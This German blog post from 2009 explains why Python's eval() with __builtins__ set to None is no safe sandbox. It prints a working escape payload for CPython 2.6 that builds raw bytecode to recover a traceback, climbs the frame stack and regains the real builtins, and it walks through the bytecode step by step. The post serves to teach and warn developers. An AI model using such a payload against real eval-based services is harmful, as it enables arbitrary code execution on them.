eval() in Python ist nicht sicher
=================================

:date: 2009-09-19 13:12:42
:tags: de, python


Häufig findet man Leute, die gerne mathematische Ausdrücke in Python
evaluieren wollen. Dabei kommen sie auf die Idee, dass man dazu ja
*eval()* benutzen könnte. Und damit das ganze auch noch sicher ist,
übergibt man eigene globals und locals, in den man optimalerweise
*__builtins__* auf ``None`` setzt, da dann CPythons *restricted mode*
aktiviert wird, ein Überbleibsel aus vergangenen Zeiten. Im *restricted
mode* darf man auf besstimme Attribute von Funktionsobjekten und
Klassen nicht zugreifen, wie etwa *__defaults__*, womit ein trügerisches
Gefühl von Sicherheit gegeben wird.

Warum ist das nicht sicher? Zunächst einmal hat man irgendwann
gemerkt, dass man in CPython einfach keine sichere Sandbox hinbekommt,
weshalb man diesen Mode nicht mehr so wirklich pflegt. Seit Python 2.6
haben Generatoren ein ``gi_code``-Attribut, wodurch man letztlich auch
eigene Code-Objekte und damit beliebige Funktionen erstellen kann. Das
führt uns also zu folgendem Code:

.. code-block:: python

   ns = dict(__builtins__=None)
   
   print eval("""(lambda d={}, t=(1).__class__.__class__:
                   (t(lambda: 23)(
                       t((_ for _ in []).gi_code)(
                           0, 1, 4, 67,"""
                           # SETUP_EXCEPT
                           r"""'y\x0c\x00'"""
                           # LOAD_CONST 1
                           r"""'d\x01\x00'"""
                           # LOAD_CONST 0
                           r"""'d\x02\x00'"""
                           # BINARY_DIVIDE
                           r"""'\x15'"""
                           # POP_TOP
                           r"""'\x01'"""
                           # POP_BLOCK
                           r"""'W'"""
                           # JUMP FORWARD 9
                           r"""'n\x09\x00'"""
                           # POP_TOP
                           r"""'\x01'"""
                           # POP_TOP
                           r"""'\x01'"""
                           # Now the traceback object is on TOS
                           # STORE_GLOBAL tb
                           r"""'a\x00\x00'"""
                           # JUMP_FORWARD 1
                           r"""'n\x01\x00'"""
                           # END_FINALLY
                           r"""'X'"""
                           # LOAD_CONST None
                           r"""'d\x00\x00'"""
                           # RETURN_VALUE
                           """'S',
                           (None, 1, 0), ('tb', ), (),
                           'evil.py', 'evil', 1, ''
                       ), d, None, ()
                   )(),d['tb'].tb_frame.f_back.f_back.f_back.f_globals)[1])()""",
                   ns, ns)
		   
Führt man das aus, fällt einem auf, dass man damit an das richtige
*__builtins__*\ -Objekt kommt, und damit dann auch beispielsweise
*__import__* aufrufen kann. Wie funktioniert das aber? Zunächst einmal
holt man sich das Builtin *type* mit ``(1).__class__.__class__`` und
speichert es sich in *t* (indem man es als Default-Argument eines
lambdas benutzt und den eigentlichen Code im Körper des lambdas
schreibt und das lambda dann aufruft). Damit erstellt man dann ein
neues Code-Objekt, das man durch ``t((_ for _ in []).gi_code)`` bekommt
und damit dann ein neues Funktionsobjekt, das man mit ``t(lambda: 23)``
bekommt. Dieses Funktionsobjekt wird dann ausgeführt.

Was macht das konstruierte Funktionsobjekt beim Ausführen? Dazu schaut
man sich die folgende Funktion an:

.. code-block:: python

   def throws():
       try:
           1 / 0
       except:
           pass

Der Bytecode der Funktion sieht dabei wie folgt aus::

  3           0 SETUP_EXCEPT            12 (to 15)

  4           3 LOAD_CONST               1 (1)
              6 LOAD_CONST               2 (0)
              9 BINARY_DIVIDE
             10 POP_TOP
             11 POP_BLOCK
             12 JUMP_FORWARD             7 (to 22)

  5     >>   15 POP_TOP
             16 POP_TOP
             17 POP_TOP

  6          18 JUMP_FORWARD             1 (to 22)
             21 END_FINALLY
        >>   22 LOAD_CONST               0 (None)
             25 RETURN_VALUE
	     
Man beachte die drei ``POP_TOP``\ s im Mittelteil (der den except-Block
darstellt): CPython speichert bei einer Ausnahme den Typ der Ausnahme,
die Ausnahme selbst und ein Traceback-Objekt auf dem Stack (das, was
*sys.exc_info()* zurückliefert). Und bekanntlich kommt man mit
Traceback-Objekten an ein Frame-Objekt, und mit Frame-Objekten kann
man sich den Stack hochhangeln und kommt somit an die globals des
Aufrufers, in der man die richtigen *__builtins__* findet. Ergo
konstruiert man sich einfach eine Funktion, die das Traceback-Objekt
eben in einem globalen Namen speichert anstatt es einfach vom Stack
verschwinden zu lassen.
